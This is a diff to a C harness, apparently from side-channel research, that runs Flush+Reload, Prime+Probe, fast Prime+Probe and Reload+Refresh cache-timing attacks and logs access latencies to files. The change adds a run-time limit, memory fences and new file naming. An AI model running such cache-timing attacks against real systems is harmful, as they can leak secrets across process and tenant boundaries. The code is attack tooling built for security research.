@@ -7,6 +7,7 @@
 #include <sched.h>
 #include <unistd.h>
 #include <sys/wait.h>
+#include <time.h>
 
 #include "T.h"           /*Shared library*/
 #include "cache_utils.h" /*Cache manipulation functions*/
@@ -30,6 +31,7 @@
 #define RES_MEM (1UL * 1024 * 1024) * 4 * CACHE_SIZE
 
 #define CLEAN_NOISE 1
+#define WAIT_FIXED 0
 
 int target_pos; //Should be the same in the sender
 long int *base_address;
@@ -46,22 +48,26 @@ FILE *out_fd;
 uintptr_t phys_addr;
 int slice, set;
 int wait_time;
+int max_run_time;
 int S, C, D;
+
+struct timespec request,remain;
 
 int main(int argc, char **argv)
 {
     int i;
     char file_name[40];
     //Just use first argument
-    if (argc < 4)
+    if (argc < 5)
     {
-        printf("Expected target address (int), attack name (-fr,-pp,-rr) and wait cycles\n");
+        printf("Expected target address (int), attack name (-fr,-pp,-rr) wait cycles and max run time\n");
         return -1;
     }
     else
     {
         target_pos = atoi(argv[1]);
         wait_time = atoi(argv[3]);
+	max_run_time = atoi(argv[4]);
         if (!target_pos)
         {
             printf("Error with the target address \n");
@@ -74,7 +80,7 @@ int main(int argc, char **argv)
     if (strcmp(argv[2], "-fr") == 0)
     {
         printf("TEST FLUSH+RELOAD\n");
-        snprintf(file_name, 40, "test_fr_%d.txt", wait_time);
+        snprintf(file_name, 40, "test_fr_%d_%d.txt",target_pos, wait_time);
         out_fd = fopen(file_name, "w");
         if (out_fd == NULL)
             fprintf(stderr, "Unable to open file\n");
@@ -88,20 +94,28 @@ int main(int argc, char **argv)
             while (timestamp() < tim + wait_time)
                 ;
             t = access_timed_flush(target_address);
+            //t = access_timed_full_flush(target_address);
             if (t < (TIME_LIMIT - 50))
             {
-                printf("%i \n", t);
+                //printf("%i \n", t);
                 cont++;
             }
         }
+	clock_gettime(CLOCK_MONOTONIC, &request);
+        clock_gettime(CLOCK_MONOTONIC, &remain);
         /*Carry the attack*/
-        while (1)
+        while (remain.tv_sec<(request.tv_sec+max_run_time+1))
         {
             t = access_timed_flush(target_address);
+            //t = access_timed_full_flush(target_address);
+            mfence();
             tim = timestamp();
+#if WAIT_FIXED
             while (timestamp() < tim + wait_time)
                 ;
-            fprintf(out_fd, "%i %lu\n", t, tim);
+#endif
+            fprintf(out_fd, "%i %i %lu\n", t, 10, tim);
+	    clock_gettime(CLOCK_MONOTONIC, &remain);
         }
         fclose(out_fd);
         return 0;
@@ -109,7 +123,7 @@ int main(int argc, char **argv)
     else if (!strcmp(argv[2], "-pp"))
     {
         printf("TEST PRIME+PROBE\n");
-        snprintf(file_name, 40, "test_pp_%d.txt", wait_time);
+        snprintf(file_name, 40, "test_pp_%d_%d.txt",target_pos, wait_time);
         out_fd = fopen(file_name, "w");
         if (out_fd == NULL)
             fprintf(stderr, "Unable to open file\n");
@@ -155,9 +169,12 @@ int main(int argc, char **argv)
         while (1)
         {
             t = probe_one_set(prime_address);
+            mfence();
             tim = timestamp();
+#if WAIT_FIXED
             while (timestamp() < tim + wait_time)
                 ;
+#endif
             fprintf(out_fd, "%i %i %lu\n", t, 10, tim);
         }
         fclose(out_fd);
@@ -173,11 +190,11 @@ int main(int argc, char **argv)
             printf("Also expected S,C and D for fast Prime+Probe\n");
             return -1;
         }
-        S = atoi(argv[4]);
-        C = atoi(argv[5]);
-        D = atoi(argv[6]);
+        S = atoi(argv[5]);
+        C = atoi(argv[6]);
+        D = atoi(argv[7]);
         printf("TEST FAST PRIME+PROBE (Rowhammer.js)\n");
-        snprintf(file_name, 40, "test_fpp_%d.txt", wait_time);
+        snprintf(file_name, 40, "test_fpp_%d_%d.txt",target_pos, wait_time);
         out_fd = fopen(file_name, "w");
         if (out_fd == NULL)
             fprintf(stderr, "Unable to open file\n");
@@ -224,8 +241,10 @@ int main(int argc, char **argv)
         {
             t = fast_prime(long_eviction_set, S, C, D);
             tim = timestamp();
+#if WAIT_FIXED
             while (timestamp() < tim + wait_time)
                 ;
+#endif
             fprintf(out_fd, "%i %i %lu\n", t, 10, tim);
         }
         fclose(out_fd);
@@ -237,7 +256,7 @@ int main(int argc, char **argv)
     else if (!strcmp(argv[2], "-rr"))
     {
         printf("TEST RELOAD+REFRESH\n");
-        snprintf(file_name, 40, "test_rr_%d.txt", wait_time);
+        snprintf(file_name, 40, "test_rr_%d_%d.txt",target_pos,wait_time);
         out_fd = fopen(file_name, "w");
         if (out_fd == NULL)
             fprintf(stderr, "Unable to open file\n");
@@ -318,8 +337,10 @@ int main(int argc, char **argv)
             lfence();
             t1 = refresh_step(&elements_set[0]);
             tim = timestamp();
+#if WAIT_FIXED
             while (timestamp() < tim + wait_time)
                 ;
+#endif
 #if CLEAN_NOISE
             if (t1 > CLEAN_REFRESH_TIME)
             {
